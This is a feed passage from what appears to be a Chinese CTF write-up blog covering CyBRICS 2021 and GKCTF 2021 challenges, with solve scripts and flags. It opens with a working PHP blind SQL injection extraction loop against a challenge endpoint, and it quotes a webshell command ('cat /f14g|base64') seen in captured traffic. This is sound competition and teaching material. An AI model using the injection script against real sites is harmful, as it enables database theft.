  <span class="string">&quot;timeout&quot;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">    <span class="string">&quot;allow_redirects&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;verify&quot;</span> =&gt; <span class="literal">false</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$count</span> = <span class="number">1</span>; <span class="variable">$count</span> &lt;= <span class="number">100</span>; <span class="variable">$count</span>++)&#123;</span><br><span class="line">    <span class="variable">$low</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$high</span> = <span class="number">126</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$low</span> &lt;= <span class="variable">$high</span>)&#123;</span><br><span class="line">        <span class="variable">$mid</span> = (<span class="keyword">int</span>)((<span class="variable">$low</span> + <span class="variable">$high</span>) / <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;&#x27; or if((ascii(substr((<span class="subst">&#123;$statement&#125;</span>),<span class="subst">&#123;$count&#125;</span>,1)) &gt; <span class="subst">&#123;$mid&#125;</span>),1,cot(0)), NOW()) #&quot;</span>;</span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;post(<span class="variable">$URL</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;proxy&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;http&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;https&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="string">&#x27;form_params&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$sql</span>,</span><br><span class="line">                <span class="string">&quot;digest&quot;</span> =&gt; md5(<span class="variable">$sql</span>)</span><br><span class="line">            )</span><br><span class="line">        ));</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody()-&gt;getContents();</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="variable">$content</span>, <span class="string">&quot;cot&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$high</span> = <span class="variable">$mid</span> - <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$low</span> = <span class="variable">$mid</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$count</span> . PHP_EOL;</span><br><span class="line">    <span class="variable">$text</span> .= chr((<span class="keyword">int</span>)((<span class="variable">$high</span> + <span class="variable">$low</span> + <span class="number">1</span>) / <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$text</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;1N53r7_0ld_900d_5ql&#125;</span><br></pre></td></tr></table></figure><h2 id="Cyber"><a href="#Cyber" class="headerlink" title="Cyber"></a>Cyber</h2><h3 id="Mic-Check"><a href="#Mic-Check" class="headerlink" title="Mic Check"></a>Mic Check</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Th1S_i5_T3h_R34l_m1C_ch3CK_f1A6&#125;</span><br></pre></td></tr></table></figure><h2 id="rebyC"><a href="#rebyC" class="headerlink" title="rebyC"></a>rebyC</h2><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><blockquote><p>Author: Mikhail Driagunov (@aethereternity)</p><p>Check out this cool new game!</p><p>I heard they serve flags at level 5.</p></blockquote><p>依次解出前四个简单关卡。第五关给了一个滚动的二维码。先使用 GIF Splitter 抽帧分离，再写个脚本将其还原出来。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627192904950265/9d927c64c13d995920d8d9fff41cac5bde5a700f.png@100w"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">ny = <span class="number">0</span></span><br><span class="line">newImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">989</span>, <span class="number">162</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">145</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;./gif/IMG00%03d.bmp&quot;</span> % x)</span><br><span class="line">    image = Image.<span class="built_in">open</span>((<span class="string">&quot;./gif/IMG00%03d.bmp&quot;</span> % x))</span><br><span class="line">    <span class="built_in">slice</span> = image.crop((<span class="number">46</span>, <span class="number">496</span>, <span class="number">1036</span>, <span class="number">502</span>))</span><br><span class="line">    newImage.paste(<span class="built_in">slice</span>, (<span class="number">0</span>, ny))</span><br><span class="line">    ny += <span class="number">6</span></span><br><span class="line">newImage = newImage.resize((<span class="number">500</span>, <span class="number">500</span>))</span><br><span class="line">newImage.save(<span class="string">&quot;this.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>扫描二维码可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;N0w_Y0u_4r3_4_c4sh13r_LOL&#125;</span><br></pre></td></tr></table></figure><h3 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h3><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)</p><p>Guessing challenges? On <em>my</em> CyBRICS? It’s more likely than you think.</p><p>Prove you’re a true CTFer!</p></blockquote><p>填写验证码的小游戏，要分解颜色才能看见验证码。构造如下交互式脚本来解决问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># bit planes codes are from https://medium.com/@stephanie.werli/image-steganography-with-python-83381475da57</span></span><br><span class="line"><span class="comment"># Interactive Script</span></span><br><span class="line"></span><br><span class="line">session = requests.Client(proxies=&#123;</span><br><span class="line">    <span class="string">&quot;http://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    image = session.get(<span class="string">&quot;https://captf-cybrics2021.ctf.su/captcha.php&quot;</span>).content</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    file.write(image)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">    data = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;r&quot;</span>))</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        res = data // <span class="number">2</span> ** k &amp; <span class="number">1</span></span><br><span class="line">        out.append(res * <span class="number">255</span>)</span><br><span class="line">    b = np.hstack(out)</span><br><span class="line">    Image.fromarray(b).show()</span><br><span class="line"></span><br><span class="line">    captcha = <span class="built_in">input</span>(<span class="string">&quot;Enter the captcha you have seen in the window:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;https://captf-cybrics2021.ctf.su/&quot;</span>, data=&#123;<span class="string">&quot;answer&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;captcha&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Hand up failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Handed up <span class="subst">&#123;captcha&#125;</span> with response <span class="subst">&#123;response.content.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627200498307069/fffe6eca797af1a13937dc3b4910cd55a59909e6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;a_k33n_Ey3_wi11_sp0T_r1GhT_aw4Y&#125;</span><br></pre></td></tr></table></figure><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="LX-100"><a href="#LX-100" class="headerlink" title="LX-100"></a>LX-100</h3><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)</p><p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.</p><p>Anyway, we were discussing CyBRICS flags there, hope there’s no way to leak them.</p></blockquote><p>Wireshark 打开流量包，跟踪 UDP 流到 4 可以得到一份 MJPEG 视频流。将其导出后修正拓展名为 MJPEG，使用 VLC Media Player 播放可得如下包含 flag 的图片。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627212693312054/c8daa1b09c442b39ad9bfe7baf6f005776aaeef0.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Lost_Secrets_In_The_Air&#125;</span><br></pre></td></tr></table></figure><h3 id="ASCII-Terminal"><a href="#ASCII-Terminal" class="headerlink" title="ASCII Terminal"></a>ASCII Terminal</h3><blockquote><p>Author: Artur Khanov (<a href="https://t.me/awengar">@awengar</a>)</p><p>you have an ASCII terminal. It really works, check with the <a href="https://cybrics.net/files/id.txt"><code>id</code> command</a></p></blockquote><p>把字符画当作指令来执行的终端，字符画长度为 30 行，以 <code>.</code> 单独做一行结束。</p><blockquote><p><a href="https://www.text-image.com/convert/ascii.html">https://www.text-image.com/convert/ascii.html</a></p></blockquote><p>用 PowerPoint 做出如下图片，然后使用上述网站生成字符画，然后稍作处理得到如下载荷，因为 <code>l</code> 时常被误认，所以将其去除了，同时因为有相当部分字符不允许被使用，这里使用了纯星号和点替换生成的字符画中的字符。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627214895267041/70468b8a1da752ab51624eacd5666479ec8afb19.jpg"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................***::::**..............***......................</span><br><span class="line">........................................................................*.*..................................................************............****......................</span><br><span class="line">......................................................................:****................................................**************.......:*....***.....**...............</span><br><span class="line">......................................................................*****...............................................******...............****:*.***..******..............</span><br><span class="line">......................................................................*****...............................................*****...............*******************..............</span><br><span class="line">......................:***********........*************:*.......*********************.....................................*****...................*:*******:*..................</span><br><span class="line">..................*:**************........*****************.....*********************..............................*********************.......*****************...............</span><br><span class="line">..................******:.....*:*:........*****..**..******......********************..............................**********************......******************..............</span><br><span class="line">.................******................................*****..........*****........................................*********************.......:***...***...****...............</span><br><span class="line">................*****...........................***********...........*****...............................................*****......................****......................</span><br><span class="line">...............******.......................***************...........*****...............................................*****......................****......................</span><br><span class="line">...............******.....................*****************...........*****...............................................*****................................................</span><br><span class="line">................****:...................******.........****...........*****...............................................*****................................................</span><br><span class="line">................******..................*****..........****...........*****...............................................*****................................................</span><br><span class="line">.................******:.******.:*......*****:**.**.*******...........******.********.....................................*****................................................</span><br><span class="line">..................:***************.......******************............**************.....................................*****................................................</span><br><span class="line">.....................************..........**********..:****............*:***********.....................................****:................................................</span><br><span class="line">...............................................*...............................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">...............................................................................................................................................................................</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>将载荷发送后可得到如下响应。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="line">..........................%@,...............%@,......................,@@@;?@@@@@@@@@@#.,#@@@@@%....$@@@@@@%...$@@@@@@%..,#@@@@@%...*@@@@@@@@@@:......:@@;.....?@@@@@@@%..,@@@@@@@@@:...............,$@*.....$@@@@@@%...............+@@@@@@@@?.....%@@@@@%....%@@@@@%...*@@@@@@@@@;..?@@$................................................................................................................................................................................................................................................</span><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="line">......%@$:,:$@+...*@@#....%@@;,:$@%..%@,....%@,.%@$:,:$@+:@$:,,;#@,..*@:.......#@,.....$@%:,;$@%..$@%:,;$@%..$@%:,;$@%..$@%:,;$@%..*@*......%@%.......?@;....?@@*:,:*@@?....$@,.....................;@*....$@%:,;$@%..............;@@%;,,:+#@@;..;@#;,;#@;..;@#;,;#@;..*@*...,;%@@:...?@:...............................................................................................................................................................................................................................................</span><br><span class="line">......,#@@@@@%....,@@*....%@%@@@@#,..%@,....%@,.,#@@@@@%..%@@@@@@?...*@;.......#@,.....:@@@@@@#,..:@@@@@@#,..:@@@@@@#,..:@@@@@@#,..*@*......,@@;......?@;.....%@@@@@@@%,....@@......................;@*....:@@@@@@#,...............+@@@@@@@@#;....%@@@@@%....%@@@@@%...*@@@@@@@@@;....?@,...............................................................................................................................................................................................................................................</span><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="linespan><br><span class="line">........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;T3553R4C7_15_G00D&#125;</span><br></pre></td></tr></table></figure><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h3><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)</p><p>We have got the home folder from a criminal’s computer. Try to find his/her real name.</p><p>Flag format in uppercase: LASTNAME FIRSTNAME (ex: IVANOV IVAN)</p></blockquote><p>附件中有一份 Bash history。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git add *</span><br><span class="line">git commit -m &quot;instagram filter&quot;</span><br><span class="line">git push origin main</span><br><span class="line">rm *</span><br><span class="line">ls -la</span><br><span class="line">rm -rf .git</span><br></pre></td></tr></table></figure><p>.ssh 文件夹中还有一份私钥，因此尝试使用这个私钥去连接 GitHub，可以得到如下响应。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi poggersdog12! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br><span class="line">Connection to github.com closed.</span><br></pre></td></tr></table></figure><p>因此得到了此人的 GitHub ID <code>poggersdog12</code>。</p><blockquote><p><a href="https://gist.github.com/thewoolleyman/2294542455a8e673e0a844362e0b8bac#file-github-graphql-commits-by-ref">https://gist.github.com/thewoolleyman/2294542455a8e673e0a844362e0b8bac#file-github-graphql-commits-by-ref</a></p></blockquote><p>使用上述参考 GraphQL 语句略作修改可以查出一个 email <code>vividcoala@localhost.com</code>。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627218434788759/be78679f4557c7b6405a3484302ebba51763e910.png"></p><p>根据前面的 commit 信息可知有一个 Instagram，因此尝试访问 vividcoala 的 Instagram，在 filter 中可以发现一张机票，使用 Read My Boarding Pass 扫描可得如下内容。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627220136652090/57e3d4f7fcbae997691bb97380bb8c488abe4baf.png@550h_500w_1c"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIVOV NIKOLAI</span><br></pre></td></tr></table></figure><h3 id="Recording"><a href="#Recording" class="headerlink" title="Recording"></a>Recording</h3><blockquote><p>Author: Mikhail Driagunov (<a href="https://t.me/aethereternity">@aethereternity</a>)</p><p>I’ve found a strange <a href="https://cybrics.net/files/strange_recording.mrf">recording</a>.</p><p>What does it hide?</p></blockquote><p>使用 Macro Recorder 打开 MRF 文件。将系统的语言和 Firefox 的语言调整为英语，此时窗口标题才能跟记录中的对照上。按照 Firefox 的位置将开始菜单的磁贴摆放好，并在 Firefox 中构造一个 pastebin 的锁定记录的页面。</p><p>新建一个记录按照原本记录中的窗口大小设置，然后播放记录，此时屏幕键盘的窗口大小和位置将被调整到预设位置。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627225176205320/f60a62a924f01da0bc22d185dd42b998685db184.png"></p><p>将鼠标的点击关掉，播放提供的记录，将两遍虚拟键盘的记录路径对应键位得到输入内容。补充后可以得到下列内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com&#x2F;uzqCjFUa</span><br><span class="line">9yDz5iZprd</span><br></pre></td></tr></table></figure><p>使用密码解密 Pastebin 后可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;m4cr0_rulz_w000t&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/aeac0311.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>June GKCTF X DASCTF应急挑战杯</title>
      <link>https://lemonprefect.cn/zh-CN/posts/751c0b7.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/751c0b7.html</guid>
      <pubDate>Wed, 21 Jul 2021 07:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&quot;excel-骚操作&quot;&gt;&lt;a href=&quot;#excel-骚操作&quot; class=&quot;headerlink&quot; title=&quot;excel 骚操作&quot;&gt;&lt;/a&gt;excel 骚操作&lt;/h3&gt;&lt;p&gt;使用 Microsoft Excel 打开文件可以发现其实部分单元格中有 1，在新的 Sheet 中使用 &lt;code&gt;=IF(Sheet1!A2=1,1,0)&lt;/code&gt; 将其抄一份。&lt;/p&gt;
&lt;p&gt;&lt;img</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="excel-骚操作"><a href="#excel-骚操作" class="headerlink" title="excel 骚操作"></a>excel 骚操作</h3><p>使用 Microsoft Excel 打开文件可以发现其实部分单元格中有 1，在新的 Sheet 中使用 <code>=IF(Sheet1!A2=1,1,0)</code> 将其抄一份。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255239007.c4c0d376181685834a4f21ae6d6d5704273deafd.png"></p><p>在新的 Sheet 中对长宽都为 35 的区域应用公式，将列宽调为 1.8 并应用如下条件格式规则。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255348953.e5944fbc7f5e6553b6eb2e7f31f8ba675ef091de.png"></p><p>可以发现单元格填充出了如下汉信码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/c67b07d5-8cae-46d2-9e85-51c92780b759/1626255421861.71aaeb87c7e4605693b1430697b7bccec7aabce8.png@100w"></p><p>扫描汉信码可得如下包含 flag 的字符串。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smsto:13511100000:flag&#123;9ee0cb62-f443-4a72-e9a3-43c0b910757e&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9ee0cb62-f443-4a72-e9a3-43c0b910757e&#125;</span><br></pre></td></tr></table></figure><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>跟踪 TCP 流一把梭可以看到包含 <code>QER1=cat+%2Ff14g%7Cbase64</code> 的 POST 流量。将响应使用如下 CyberChef Receipt 处理，可以得到关键信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#39;None&#39;)</span><br><span class="line">Strip_HTTP_headers()</span><br><span class="line">Gunzip()</span><br><span class="line">From_Hex(&#39;None&#39;)</span><br><span class="line">From_Base64(&#39;A-Za-z0-9+&#x2F;&#x3D;&#39;,true)</span><br><span class="line">Reverse(&#39;Character&#39;)</span><br><span class="line">From_Base64(&#39;A-Za-z0-9+&#x2F;&#x3D;&#39;,true)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CCCCC!!cc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCC0 20:01:13</span><br><span class="line">[回车] [回车] [回车] ffllaagg&#123;&#123;&#125;&#125;WWeell-----------</span><br><span class="line">窗口:*new 52 - Notepad++</span><br><span class="line">时间:2021-03-301:13</span><br><span class="line">[回车] </span><br><span class="line">---------------------------------------------</span><br><span class="line">窗口:*new 52 - Notepad++</span><br><span class="line">时间:2021-03-30 20:###########</span><br><span class="line">--------------------------------------------21-03-30 20:01:08         #</span><br><span class="line">############################</span><br><span class="line"></span><br><span class="line">#######################################</span><br><span class="line">#         20</span><br></pre></td></tr></table></figure><p>从其中可以得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_GkC4F_m1siCCCCCC!&#125;</span><br></pre></td></tr></table></figure><h3 id="你知道apng吗"><a href="#你知道apng吗" class="headerlink" title="你知道apng吗"></a>你知道apng吗</h3><p>用 Chrome 查看 apng 动图可以发现有三个二维码，将其转为普通的 GIF 后使用 Photoshop 稍作处理后扫描并将内容拼合即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3c7e4e5-9b9d-ad20-0327-288a235370ea&#125;</span><br></pre></td></tr></table></figure><h3 id="银杏岛の奇妙冒险"><a href="#银杏岛の奇妙冒险" class="headerlink" title="银杏岛の奇妙冒险"></a>银杏岛の奇妙冒险</h3><p>解压附件可得一个 Minecraft 存档，在 mods 文件夹中可以发现其使用了名为 CustomNPCs_1.12.2-(05Jul20) 的插件。找到这个插件位于 <code>.minecraft\saves\Where is the flag\customnpcs\quests\主线</code> 的存档 JSON 文件，在每个文件中可以读到 pages 段的内容，从而拼接出 flag。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">w3lc0me_</span><br><span class="line">t0_9kctf_</span><br><span class="line">2021_</span><br><span class="line">Check_1n</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GKCTF&#123;w3lc0me_t0_9kctf_2021_Check_1n&#125;</span><br></pre></td></tr></table></figure><h3 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox Forensics"></a>FireFox Forensics</h3><p>解压附件发现是 Firefox 保存的登录凭据。按照官方的指引替换文件即可将加密的凭据恢复到浏览器中。</p><blockquote><p><a href="https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile">https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile</a></p></blockquote><p><img 